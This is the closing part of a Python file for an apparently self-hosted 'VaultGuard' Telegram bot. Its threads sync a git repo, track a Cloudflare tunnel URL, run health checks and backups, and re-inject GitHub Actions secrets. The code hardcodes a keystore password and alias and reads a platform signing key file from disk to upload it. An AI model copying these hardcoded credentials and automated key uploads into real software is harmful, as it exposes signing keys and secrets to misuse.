                    log_w.warning(f"Post-pull secret audit error: {e}")

            # Layer 7: Periodic secret audit every 120 pulls (~1 hour)
            _pull_count += 1
            if _pull_count % 120 == 0:
                try:
                    audit_github_secrets(alert_on_fix=True)
                except Exception as e:
                    log_w.warning(f"Periodic secret audit error: {e}")

        except Exception as e:
            log_w.error(f"Git pull loop error: {e}")
            write_sync_status("error", str(e))
        time.sleep(GIT_PULL_INTERVAL)


def cloudflare_url_loop():
    """Thread 2: Monitor Cloudflare tunnel URL every 10s."""
    global _current_tunnel_url
    log_w.info("Cloudflare URL monitor started")
    while True:
        try:
            new_url = None
            if os.path.exists(CLOUDFLARED_LOG):
                with open(CLOUDFLARED_LOG, "r",
                          encoding="utf-8",
                          errors="replace") as f:
                    for line in f:
                        m = re.search(
                            r"https://[a-z0-9\-]+"
                            r"\.trycloudflare\.com",
                            line
                        )
                        if m:
                            new_url = m.group(0)
            if not new_url:
                try:
                    with urllib.request.urlopen(
                        "http://localhost:2000/quicktunnel",
                        timeout=3
                    ) as r:
                        data    = json.loads(r.read())
                        new_url = ("https://"
                                   + data.get("hostname", ""))
                except Exception:
                    pass
            if new_url and new_url != _current_tunnel_url:
                log_w.info(f"Tunnel URL changed: {new_url}")
                _current_tunnel_url = new_url
                if update_stringpool_url(new_url):
                    git_push_url_update(new_url)
        except Exception as e:
            log_w.error(f"Cloudflare URL monitor error: {e}")
        time.sleep(URL_CHECK_INTERVAL)


def _ensure_git_healthy():
    """
    Layer 10: Self-healing git environment check.
    Runs before every sync cycle.
    """
    # Verify git binary
    git = _find_git()
    if not git:
        log_w.warning("Git not found — attempting PATH fix")
        return

    # Verify credentials
    ensure_git_credentials()

    # Verify remote URL
    rc, url, _ = run_git("git remote get-url origin")
    if rc == 0 and url.strip() != config.CORRECT_REMOTE_URL:
        log_w.warning("Wrong remote URL — fixing ...")
        run_git(
            f"git remote set-url origin "
            f"{config.CORRECT_REMOTE_URL}"
        )

    # Verify branch
    rc, branch, _ = run_git(
        "git symbolic-ref --short HEAD", timeout=5)
    if rc == 0 and branch.strip() != "main":
        log_w.warning(f"Wrong branch: {branch} — fixing ...")
        run_git("git checkout main", timeout=30)

    # Cleanup index.lock
    cleanup_git_lock()


def health_check_loop():
    """Thread 3: Service health check + probation check every 5 min."""
    log_w.info("Health check loop started (Layer 10)")
    while True:
        try:
            health_check_services()
            # Layer 5: Check probation after every health check
            _check_probation()
            # Layer 10: Self-healing git environment
            _ensure_git_healthy()
        except Exception as e:
            log_w.error(f"Health check error: {e}")
        time.sleep(HEALTH_CHECK_INTERVAL)


def backup_loop():
    """Thread 4: 24h encrypted Telegram backup (Layer 10)."""
    log_w.info("Backup loop started (Layer 10 — 24h interval)")
    # First backup after 1 hour (not immediately on startup)
    time.sleep(3600)
    while True:
        try:
            _do_backup()
        except Exception as e:
            log_w.error(f"Backup loop error: {e}")
        time.sleep(BACKUP_INTERVAL)


# ── Layer 10: GitHub Secrets health monitor ───────────────────────────────────

# Required secrets that must always exist in GitHub
REQUIRED_GITHUB_SECRETS = [
    "TELEGRAM_BOT_TOKEN",
    "TELEGRAM_CHAT_ID",
    "KEYSTORE_BASE64",
    "KEYSTORE_PASSWORD",
    "KEY_ALIAS",
]


def _get_repo_public_key_bot() -> tuple:
    """Get GitHub repo public key. Returns (key_id, pub_key_b64)."""
    try:
        url = (f"https://api.github.com/repos/"
               f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
               f"/actions/secrets/public-key")
        req = urllib.request.Request(
            url,
            headers={
                "Authorization": f"token {config.GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }
        )
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read().decode())
            return data.get("key_id", ""), data.get("key", "")
    except Exception as e:
        log_w.error(f"Get public key failed: {e}")
        return "", ""


def _encrypt_secret_bot(pub_key_b64: str,
                         secret_value: str) -> str:
    """Encrypt secret with repo public key using PyNaCl."""
    try:
        import base64 as _b64
        from nacl import public as _pub
        pk_bytes  = _b64.b64decode(pub_key_b64)
        pk        = _pub.PublicKey(pk_bytes)
        box       = _pub.SealedBox(pk)
        encrypted = box.encrypt(secret_value.encode("utf-8"))
        return _b64.b64encode(encrypted).decode("utf-8")
    except Exception as e:
        log_w.error(f"Secret encryption failed: {e}")
        return ""


def _set_github_secret_bot(key_id: str, pub_key: str,
                            name: str, value: str) -> bool:
    """Set a single GitHub secret via API."""
    encrypted = _encrypt_secret_bot(pub_key, value)
    if not encrypted:
        return False
    url  = (f"https://api.github.com/repos/"
            f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
            f"/actions/secrets/{name}")
    body = json.dumps({
        "encrypted_value": encrypted,
        "key_id":          key_id,
    }).encode()
    try:
        req = urllib.request.Request(
            url, data=body, method="PUT",
            headers={
                "Authorization": f"token {config.GITHUB_TOKEN}",
                "Accept":        "application/vnd.github.v3+json",
                "Content-Type":  "application/json",
            }
        )
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status in (201, 204)
    except Exception as e:
        log_w.error(f"Set secret {name} failed: {e}")
        return False


def _list_github_secrets_bot() -> list:
    """List existing GitHub secret names."""
    try:
        url = (f"https://api.github.com/repos/"
               f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
               f"/actions/secrets?per_page=100")
        req = urllib.request.Request(
            url,
            headers={
                "Authorization": f"token {config.GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json",
            }
        )
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read().decode())
            return [s["name"] for s in data.get("secrets", [])]
    except Exception as e:
        log_w.error(f"List secrets failed: {e}")
        return []


def audit_github_secrets(alert_on_fix: bool = True):
    """
    Layer 7 + Thread 5:
    Check all required GitHub secrets exist.
    Auto re-inject missing ones from config.
    """
    if not hasattr(config, "GITHUB_TOKEN"):
        return
    token = config.GITHUB_TOKEN
    if not token or "YOUR_" in str(token):
        return

    try:
        existing = _list_github_secrets_bot()
        if not existing:
            return

        missing = [s for s in REQUIRED_GITHUB_SECRETS
                   if s not in existing]

        if not missing:
            log_w.info(
                f"GitHub secrets audit OK — "
                f"all {len(REQUIRED_GITHUB_SECRETS)} secrets present ✅"
            )
            return

        log_w.warning(f"Missing GitHub secrets: {missing}")

        # Get public key for encryption
        key_id, pub_key = _get_repo_public_key_bot()
        if not key_id:
            log_w.error("Cannot get public key — skipping secret re-injection")
            return

        fixed   = []
        failed  = []

        for secret_name in missing:
            value = None

            if secret_name == "TELEGRAM_BOT_TOKEN":
                value = getattr(config, "BOT_TOKEN", "")
            elif secret_name == "TELEGRAM_CHAT_ID":
                value = getattr(config, "MASTER_CHAT_ID", "")
            elif secret_name == "KEYSTORE_PASSWORD":
                value = "android"
            elif secret_name == "KEY_ALIAS":
                value = "platform"
            elif secret_name == "KEYSTORE_BASE64":
                # Try to read from RDP
                for ks_path in [
                    r"C:\VaultGuard\keys\platform.jks",
                    r"C:\VaultGuard\repo\platform.jks",
                ]:
                    if os.path.exists(ks_path):
                        try:
                            import base64 as _b64
                            with open(ks_path, "rb") as f:
                                value = _b64.b64encode(
                                    f.read()).decode()
                            break
                        except Exception:
                            pass

            if not value or "YOUR_" in str(value):
                log_w.warning(
                    f"No value for {secret_name} — skipping")
                failed.append(secret_name)
                continue

            success = _set_github_secret_bot(
                key_id, pub_key, secret_name, value)
            if success:
                fixed.append(secret_name)
                log_w.info(
                    f"Re-injected missing secret: {secret_name} ✅")
            else:
                failed.append(secret_name)
                log_w.error(
                    f"Failed to re-inject: {secret_name} ❌")

        # Alert if anything was fixed or failed
        if alert_on_fix and (fixed or failed):
            msg = "🔑 <b>GitHub Secrets Auto-Fixed</b>\n"
            if fixed:
                msg += "Fixed: " + ", ".join(
                    [f"<code>{s}</code>" for s in fixed]) + "\n"
            if failed:
                msg += "Failed: " + ", ".join(
                    [f"<code>{s}</code>" for s in failed])
            send_telegram_alert(msg)

        # Also check if BOT_TOKEN in config matches GitHub secret
        # (detect token rotation — config changed but GitHub not updated)
        _check_token_rotation_sync(key_id, pub_key)

    except Exception as e:
        log_w.error(f"GitHub secrets audit error: {e}")


def _check_token_rotation_sync(key_id: str, pub_key: str):
    """
    Layer 6: Detect if BOT_TOKEN changed in config but
    not synced to GitHub Secrets. Auto re-sync if mismatch
    detected via hash comparison.
    """
    try:
        # We can't read secret values from GitHub API (by design)
        # So we store a hash of the last-synced token in a local file
        hash_file = os.path.join(
            os.path.dirname(__file__), ".secret_hashes.json")

        current_token = getattr(config, "BOT_TOKEN", "")
        current_hash  = hashlib.sha256(
            current_token.encode()).hexdigest()[:16]

        stored_hashes = {}
        if os.path.exists(hash_file):
            try:
                with open(hash_file, "r") as f:
                    stored_hashes = json.load(f)
            except Exception:
                pass

        stored_hash = stored_hashes.get("BOT_TOKEN_HASH", "")

        if stored_hash and stored_hash != current_hash:
            # Token changed — re-sync to GitHub
            log_w.info(
                "BOT_TOKEN changed — re-syncing to GitHub Secrets ...")
            success = _set_github_secret_bot(
                key_id, pub_key,
                "TELEGRAM_BOT_TOKEN", current_token
            )
            if success:
                stored_hashes["BOT_TOKEN_HASH"] = current_hash
                with open(hash_file, "w") as f:
                    json.dump(stored_hashes, f)
                send_telegram_alert(
                    "🔄 <b>Token Rotation Detected</b>\n"
                    "BOT_TOKEN changed in config.py\n"
                    "TELEGRAM_BOT_TOKEN auto-updated in GitHub ✅"
                )
                log_w.info("Token rotation sync complete ✅")
        else:
            # Store current hash if not stored yet
            if not stored_hash:
                stored_hashes["BOT_TOKEN_HASH"] = current_hash
                with open(hash_file, "w") as f:
                    json.dump(stored_hashes, f)
    except Exception as e:
        log_w.error(f"Token rotation check error: {e}")


def secret_health_loop():
    """
    Thread 5: GitHub Secrets health monitor every 6 hours.
    Layer 10 — ensures secrets never go missing.
    """
    log_w.info("Secret health loop started (Layer 10 — 6h interval)")
    # First check after 5 minutes (not immediately on startup)
    time.sleep(300)
    while True:
        try:
            log_w.info("Running GitHub secrets audit ...")
            audit_github_secrets(alert_on_fix=True)
        except Exception as e:
            log_w.error(f"Secret health loop error: {e}")
        time.sleep(6 * 3600)  # 6 hours


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 14 — MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # ── Layer 1: Single instance lock ─────────────────────────
    acquire_bot_lock()

    try:
        log.info("=" * 60)
        log.info("VaultGuard Bot starting — Telegram Bot + 10-Layer Watchdog")
        log.info(f"PID     : {os.getpid()}")
        log.info(f"Repo    : {REPO_DIR}")
        log.info(f"Logs    : {LOGS_DIR}")
        log.info(f"DB      : {DB_PATH}")
        log.info(f"Sync    : every {GIT_PULL_INTERVAL}s (real-time)")
        log.info("=" * 60)

        # ── Init database ──────────────────────────────────────
        init_db()

        # ── Layer 5: Init session key from real config (cache it) ──
        _init_session_key()

        # ── Layer 2: Load persisted sessions from file ─────────
        _load_session_file()

        # ── Layer 6: Start session cleanup thread ──────────────
        threading.Thread(
            target=session_cleanup_loop,
            daemon=True, name="SessionCleanup"
        ).start()
        log.info("7-layer session system active ✅")

        # ── Layer 9: Clean stale git lock immediately ──────────
        cleanup_git_lock()

        # ── Layer 3: Register scheduled task ──────────────────
        register_scheduled_task()

        # ── Layer 4: Configure git credentials ────────────────
        ensure_git_credentials()

        # ── Layer 10: Startup health check ────────────────────
        health_check_services()

        # ── Startup alert ──────────────────────────────────────
        send_telegram_alert(
            "🟢 <b>VaultGuard Bot Started</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Telegram bot active\n"
            f"✅ Real-time sync every {GIT_PULL_INTERVAL}s\n"
            "✅ Cloudflare URL monitor active\n"
            "✅ Health check every 5 min\n"
            "✅ 24h encrypted backup active\n"
            "✅ GitHub secrets auto-heal every 6h\n"
            "✅ 7-layer session system active\n"
            "✅ 10-layer self-healing active\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Open bot → /start to login."
        )

        # ── Auto-send welcome screen after startup ─────────────
        # Sends the main dashboard automatically so admin does not
        # need to tap /start manually after every restart/push.
        try:
            _admin_id = int(config.MASTER_CHAT_ID)
            _chat_key = str(_admin_id)
            if session_valid(_admin_id):
                # Session still valid — send full dashboard with buttons
                _startup_msg = bot.send_message(
                    _admin_id,
                    text_main(_admin_id),
                    reply_markup=kb_main(),
                    parse_mode="HTML",
                )
                nav_state[_chat_key] = {
                    "screen":     "main",
                    "message_id": _startup_msg.message_id,
                }
            else:
                # No valid session — send dashboard without buttons,
                # admin taps /start to login normally.
                _startup_msg = bot.send_message(
                    _admin_id,
                    text_main(_admin_id),
                    parse_mode="HTML",
                )
                nav_state[_chat_key] = {
                    "screen":     "main",
                    "message_id": _startup_msg.message_id,
                }
        except Exception as _e:
            log.warning(f"Auto welcome screen failed: {_e}")

        # ── Start watchdog threads ─────────────────────────────
        threading.Thread(
            target=git_pull_loop,
            daemon=True, name="GitPull"
        ).start()
        threading.Thread(
            target=cloudflare_url_loop,
            daemon=True, name="Cloudflare"
        ).start()
        threading.Thread(
            target=health_check_loop,
            daemon=True, name="HealthCheck"
        ).start()
        threading.Thread(
            target=backup_loop,
            daemon=True, name="Backup"
        ).start()
        threading.Thread(
            target=secret_health_loop,
            daemon=True, name="SecretHealth"
        ).start()

        log.info("5 watchdog threads started ✅")
        log.info("Starting Telegram bot polling ...")

        # Bot polling — blocks main thread (keeps process alive)
        # Wrap in retry loop: network blip exits infinity_polling,
        # retry loop reconnects instead of letting the process die.
        while True:
            try:
                bot.infinity_polling(timeout=30, long_polling_timeout=25)
            except Exception as _poll_err:
                log.warning(f"Polling exited: {_poll_err} — reconnecting in 5s")
            else:
                log.warning("Polling exited cleanly — reconnecting in 5s")
            time.sleep(5)

    except Exception as e:
        log.error(f"Fatal error: {e}")
        import traceback
        log.error(traceback.format_exc())
    finally:
        release_bot_lock()
        log.info("vaultguard_bot.py stopped — lock released")
